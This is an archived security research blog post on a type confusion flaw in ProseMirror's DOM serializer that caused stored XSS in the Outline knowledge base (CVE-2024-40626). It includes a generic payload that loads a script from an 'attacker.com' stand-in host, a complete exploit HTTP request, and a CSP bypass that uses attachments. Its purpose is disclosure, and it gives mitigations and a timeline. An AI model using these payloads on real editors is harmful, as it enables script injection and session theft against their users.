---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-16_type-confusion-attacks-in-prosemirror-editors.md
original_filename: 2024-07-16_type-confusion-attacks-in-prosemirror-editors.md
title: Type confusion attacks in ProseMirror editors
category: documents
detected_topics:
- xss
- supply-chain
- saml
- command-injection
- otp
- cloud-security
tags:
- imported
- documents
- xss
- supply-chain
- saml
- command-injection
- otp
- cloud-security
language: en
raw_sha256: 17147b22b06dbf44a2bc4be696f2dcd5bfd3cab51210805b0effdd0b4891bda6
text_sha256: b0c3ca9ed46b17efb51fd475e6a520650b55240775a3ffe1d3509365e54d9a1b
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: false
---

# Type confusion attacks in ProseMirror editors

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-16_type-confusion-attacks-in-prosemirror-editors.md
- Source Type: markdown
- Detected Topics: xss, supply-chain, saml, command-injection, otp, cloud-security
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: False
- Raw SHA256: `17147b22b06dbf44a2bc4be696f2dcd5bfd3cab51210805b0effdd0b4891bda6`
- Text SHA256: `b0c3ca9ed46b17efb51fd475e6a520650b55240775a3ffe1d3509365e54d9a1b`


## Content

---
title: "Type confusion attacks in ProseMirror editors"
page_title: "Type confusion attacks in ProseMirror editors - by Khanh"
url: "https://blog.calif.io/p/type-confusion-attacks-in-prosemirror"
final_url: "https://blog.calif.io/p/type-confusion-attacks-in-prosemirror"
authors: ["Pham Van Khanh"]
programs: ["Outline"]
bugs: ["Type confusion", "Stored XSS", "CSP bypass"]
publication_date: "2024-07-16"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 162
---

# Type confusion attacks in ProseMirror editors

[![Khanh's avatar](https://substackcdn.com/image/fetch/$s_!uruA!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8aa20b71-fa59-4b89-8f14-27254dcf35a3_144x144.png)](https://substack.com/@khanhcalif)

[Khanh](https://substack.com/@khanhcalif)

Jul 16, 2024

12

Share

# Summary

Calif was recently engaged to audit the open source knowledge base management package [Outline](https://www.getoutline.com/). Aside from server side components, we focused on the rather complicated Outline’s editor that is based on the [ProseMirror](https://prosemirror.net/) library.

We found a type confusion issue in ProseMirror’s rendering process that leads to a [stored Cross-Site Scripting (XSS](https://portswigger.net/web-security/cross-site-scripting/stored)) vulnerability in Outline ([CVE-2024-40626](https://github.com/outline/outline/security/advisories/GHSA-888c-mvg8-v6wh)). An authenticated user can create a document containing a malicious JavaScript payload. When other users view this document, the malicious Javascript can execute in the origin of Outline.

While we demonstrated this specific vulnerability in Outline, other ProseMirror [editors](https://discuss.prosemirror.net/t/open-source-editors-based-on-prosemirror/5660) might be vulnerable to similar type confusion attacks. We recommend Outline users and other ProseMirror editors upgrade to the latest version of Outline and ProseMirror.

We specially thank the Outline and ProseMirror teams for quickly addressing the specific XSS vulnerability and the general type confusion attack vector.

# Table of content

[Summary](https://blog.calif.io/i/146679105/summary)

[ProseMirror type confusion attacks](https://blog.calif.io/i/146679105/prosemirror-type-confusion-attacks)

  * [ProseMirror content model](https://blog.calif.io/i/146679105/prosemirror-content-model)

  * [ProseMirror rendering](https://blog.calif.io/i/146679105/prosemirror-rendering)

  * [Type confusion attacks](https://blog.calif.io/i/146679105/type-confusion-attacks)

[Outline case study](https://blog.calif.io/i/146679105/outline-case-study)

  * [ProseMirror in Outline](https://blog.calif.io/i/146679105/prosemirror-in-outline)

  * [Stored XSS in the mention node spec](https://blog.calif.io/i/146679105/stored-xss-in-the-mention-node-spec)

[Recommendations](https://blog.calif.io/i/146679105/recommendations)

[Timeline](https://blog.calif.io/i/146679105/timeline)

# ProseMirror type confusion attacks

## **ProseMirror content model**

ProseMirror represents content as a JSON node tree, as follows:
  
  
  {
  "type": "doc",
  "content": [
  {
  "type": "paragraph",
  "attrs": {
  "id": "testid"
  },
  "marks": [
  {
  "type": "strong"
  }
  ],
  "content": [
  {
  "type": "text",
  "text": "test"
  }
  ]
  }
  ]
  }

Each node in the tree consists of a type, various attributes, various marks, and child nodes. The root node is a doc type node. The child nodes of each node are defined in the content array.

Editors must [define](https://prosemirror.net/docs/guide/#schema) a [schema](https://prosemirror.net/docs/ref/#model.Document_Schema) that contains [node specs](https://prosemirror.net/docs/ref/#model.NodeSpec) and [mark specs, as shown below:](https://prosemirror.net/docs/ref/#model.MarkSpec)
  
  
  export const schema = new Schema({node_specs, mark_specs})

A simple built-in schema of ProseMirror can be found [here.](https://github.com/ProseMirror/prosemirror-schema-basic/blob/master/src/schema-basic.ts)

Node specs and mark specs are almost identical. To save space, we will cover only node specs hereinafter.

Node specs contain the following information:

  * The node type: Describe the string node name.

  * The attrs property: Describe the allowlist of node attributes.

  * The parseDOM property: Parse an HTML DOM element into a JSON node.

  * The toDOM method: Convert from a JSON node to an HTML DOM element.

Here is an example node spec of heading elements:
  
  
  node_specs = {
  
  doc: {
  content: "block+"
  } as NodeSpec,
  
  heading: {
  attrs: {level: {default: 1}},
  content: "inline*",
  group: "block",
  defining: true,
  parseDOM: [
  {tag: "h1", attrs: {level: 1}},
  {tag: "h2", attrs: {level: 2}},
  {tag: "h3", attrs: {level: 3}},
  {tag: "h4", attrs: {level: 4}},
  {tag: "h5", attrs: {level: 5}},
  {tag: "h6", attrs: {level: 6}}
  ],
  toDOM(node) { 
  return ["h" + node.attrs.level, 0]
  }
  } as NodeSpec
  
  }

## **ProseMirror rendering**

To render a content, ProseMirror serializes the content's JSON node tree to an HTML DOM tree. The detailed process is described in the [library guide](https://prosemirror.net/docs/guide/#schema.serialization_and_parsing) and the [API reference](https://prosemirror.net/docs/ref/#model.DOMSerializer). This task is handled by [DOMSerializer](https://github.com/ProseMirror/prosemirror-model/blob/751134cc35481fa69ae8f9215ea3653873c8eea1/src/to_dom.ts#L27), which holds the following two arrays:

  * nodes: Map node names to the toDOM methods that take a node and return a description of the corresponding HTML DOM element.

  * marks: Map mark names to the toDOM methods that take a mark and return a description of the corresponding HTML DOM element.

To create the HTML DOM tree, ProseMirror calls[ DOMSerializer.serializeFragment](https://github.com/ProseMirror/prosemirror-model/blob/751134cc35481fa69ae8f9215ea3653873c8eea1/src/to_dom.ts#L46), passing on the JSON node tree. This method loops recursively over the JSON node tree. For each node, ProseMirror calls [DOMSerializer.serializeNodeInner](https://github.com/ProseMirror/prosemirror-model/blob/751134cc35481fa69ae8f9215ea3653873c8eea1/src/to_dom.ts#L77) to do the following steps:

  1. Call the toDOM function of the node to get a [DOMOutputSpec](https://prosemirror.net/docs/ref/#model.DOMOutputSpec) object. 

  2. Call [DOMSerializer.renderSpec](https://github.com/ProseMirror/prosemirror-model/blob/751134cc35481fa69ae8f9215ea3653873c8eea1/src/to_dom.ts#L114C26-L114C85) to convert the DOMOutputSpec object into an HTML DOM element, using the browser’s DOM API, such as createElement, createTextNode, or setAttribute.

The format of the DOMOutputSpec object in step 1 is flexible. It could be one of the following types:

  * A [DOMNode](https://developer.mozilla.org/en-US/docs/Web/API/Node) object: DOMSerializer.renderSpec will render the object as-is.

  * A text string: DOMSerializer.renderSpec will render an HTML DOM text node.

  * An array specifying a DOM element: DOMSerializer.renderSpec will render an HTML DOM element according to this spec. The array contains the following items:

  * The first item: The string HTML tag name.

  * The second item: The HTML attribute object.

  * The remaining items: Zero or more child DOMOutputSpec objects.

Below are examples of DOMOutputSpec specified as an array:

  * No child: This object renders to <div class=”test”></div>.
  
  [
  "div",
  { class: "test" },
  0
  ]

  * A text child: This object renders to <div class=”test”>text</div>.
  
  [
  "div",
  { class: "test" },
  "text"
  ]

  * A node child: This object renders to <div class=”test”><img src=”/image/path”></div>.
  
  [
  "div",
  { class: "test" },
  [
  "img",
  { src: "/image/path" },
  0
  ]
  ]

## **Type confusion attacks**

The rendering process has two important security considerations:

  * toDOM takes as input a potentially untrustworthy JSON object, and returns as output a DOMOutputSpec object.

  * The DOMOutputSpec object can be a text string or an array.

Since a JSON object can contain text strings or arrays, toDOM might just copy the input JSON to its output DOMOutputSpec. This coding pattern might lead to type confusion attacks: toDOM might think it copies text strings, but it actually copies arrays. When DOMSerializer.renderSpec processes the output, instead of creating a text node, it will create an HTML DOM element. When the arrays specify, for example, script DOM elements, this leads to XSS.

Here is an example node spec with a vulnerable toDOM function:
  
  
  {
  attrs: {
  id: {
  default: null,
  },
  src: {
  default: null,
  },
  title: {},
  },
  toDOM: (node) => [
  "div",
  {
  class: "video",
  },
  [
  "video",
  {
  id: node.attrs.id,
  src: sanitizeUrl(node.attrs.src),
  },
  node.attrs.title,
  ],
  ],
  }

In this toDOM method, node.attrs.title is copied verbatim from the JSON input. The developer wants to copy a text string because they intend to output the following HTML:
  
  
  <div class="video">
  <video id="[id]" src="[src]>
  [title]
  </video>
  </div>

However, if we control the JSON content, we can pass node.attrs.title as an array specifying an script element, as follows:
  
  
  {
  type: "<node name>",
  attrs: {
  id: "blah",
  src: "https://example.com",
  title: [
  "script",
  {
  "src": "https://attacker.com/evil.js"
  },
  ],
  },
  }

This will force DOMSerializer.renderSpec to render a script element loading a JavaScript file under our control.

# **Outline case study**

## **ProseMirror in Outline**

Outline uses ProseMirror to implement a [generic React editor](https://github.com/outline/outline/blob/main/app/editor/index.tsx). The editor is customized to support various use cases:

  * [Document editor](https://github.com/outline/outline/blob/main/app/scenes/Document/components/Editor.tsx) and[ multiplayer document editor](https://github.com/outline/outline/blob/main/app/scenes/Document/components/MultiplayerEditor.tsx)

  * [Collection description editor](https://github.com/outline/outline/blob/main/app/components/CollectionDescription.tsx)

  * [Comment editor](https://github.com/outline/outline/blob/main/app/scenes/Document/components/CommentEditor.tsx)

  * [Hover preview editor](https://github.com/outline/outline/blob/main/app/components/HoverPreview/HoverPreviewDocument.tsx)

All node specs and mark specs are defined at the following locations:

  * <https://github.com/outline/outline/tree/main/shared/editor/nodes>

  * <https://github.com/outline/outline/tree/main/shared/editor/marks>

  * <https://github.com/outline/outline/tree/main/shared/editor/extensions>

## **Stored XSS in the mention node spec**

We discovered that the [mention node spec](https://github.com/outline/outline/blob/main/shared/editor/nodes/Mention.ts) was vulnerable to a type confusion attack, via the node.attrs.label property. The simplified node spec with the vulnerable toDOM code is shown as below:
  
  
  {
  attrs: {
  label: {},
  id: {},
  },
  toDOM: (node) => [
  "span",
  {
  class: `${node.type.name} use-hover-preview`,
  id: node.attrs.id,
  },
  node.attrs.label,
  ],
  }

To exploit this vulnerability, we create a new comment for a document, then update it with the following HTTP request:
  
  
  POST /api/comments.update HTTP/1.1
  Host: docs.calif-pentest.com
  Cookie: sessions=%7B%7D; lastSignedIn=saml; accessToken=[accessToken]
  Content-Length: 463
  Cache-Control: no-cache
  Pragma: no-cache
  X-Api-Version: 3
  Sec-Ch-Ua-Mobile: ?0
  X-Editor-Version: 13.0.0
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
  Content-Type: application/json
  Accept: application/json
  Sec-Ch-Ua-Platform: "Windows"
  Origin: <https://docs.calif-pentest.com>
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Priority: u=1, i
  Connection: keep-alive
  
  {
  "data": {
  "type": "doc",
  "content": [
  {
  "type": "paragraph",
  "content": [
  {
  "type": "mention",
  "attrs": {
  "type": "user",
  "modelId": "98e9c4e7-d4a7-48c9-98f4-f6c89183398f",
  "actorId": "98e9c4e7-d4a7-48c9-98f4-f6c89183398f",
  "id": "dcca1178-0858-48ca-a6e0-ce1dd47f2d61",
  "label": [
  "script",
  {
  "src": "<https://docs.calif-pentest.com/api/attachments.redirect?id=8f16c968-a712-4bc7-8ea9-47ab3044502b>"
  },
  "testxss"
  ]
  }
  },
  {
  "type": "text",
  "text": " a"
  }
  ]
  }
  ]
  },
  "id": "28d55628-5e58-4635-9b9c-e8aaeede4df3"
  }

Instead of passing a string value for the label property, we passed an array:
  
  
  [
  "script",
  {
  "src": "<https://docs.calif-pentest.com/api/attachments.redirect?id=8f16c968-a712-4bc7-8ea9-47ab3044502b>"
  },
  "testxss"
  ]

Due to strict CSP rules, Outline does not load external JavaScript files. We can bypass this by attaching a JavaScript file into a document, and reference it via an attachment link like this:
  
  
  https://docs.calif-pentest.com/api/attachments.redirect?id=8f16c968-a712-4bc7-8ea9-47ab3044502b

[![](https://substackcdn.com/image/fetch/$s_!O-rI!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F41cea478-39a2-42cf-9b5c-6c1d999442d1_3414x1806.png)](https://substackcdn.com/image/fetch/$s_!O-rI!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F41cea478-39a2-42cf-9b5c-6c1d999442d1_3414x1806.png)

# **Recommendations**

We showed how to exploit a type confusion issue to mount a stored XSS attack in Outline. Due to the complexity of ProseMirror editors, we believe there might be other attacks. To mitigate our specific attack or XSS attacks in general, we recommend implementing the following mitigations.

## **Mitigate type confusion attacks**

We recommend updating the toDOM functions to verify all node attributes. Most node attributes are strings, and should be verified as so.

## **Sandbox the editor**

We recommend re-designing the editor to render content in sandboxed iframes. An editor usually supports a lot of content types, such as math, external embeds, code highlight, Mermaid diagram, etc. These content types pull in many external libraries, which significantly increases the attack surface. Sandboxing the editor should help reduce the impact of any vulnerabilities.

## **Allow developers to declare stricter schema rules**

This recommendation is for ProseMirror maintainers. ProseMirror lacks strict schema declarations for node attributes, especially the attribute type. Editor developers might forget to validate node attributes by themselves. We recommend the ProseMirror team to:

  * Provide a convenient way to declare allowed types of node attributes.

  * Enforce a default string type for undeclared node attributes. 

# **Timeline**

  * July 12 2024: We reported the issue to Outline.

  * July 14 2024: Outline fixed the issue and contacted ProseMirror maintainers. ProseMirror updated a new version and published a [security guide](https://discuss.prosemirror.net/t/heads-up-xss-risk-in-domserializer/6572).

  * July 16 2024: Outline released a new version and published an [advisory](https://github.com/outline/outline/security/advisories/GHSA-888c-mvg8-v6wh). 

12

Share
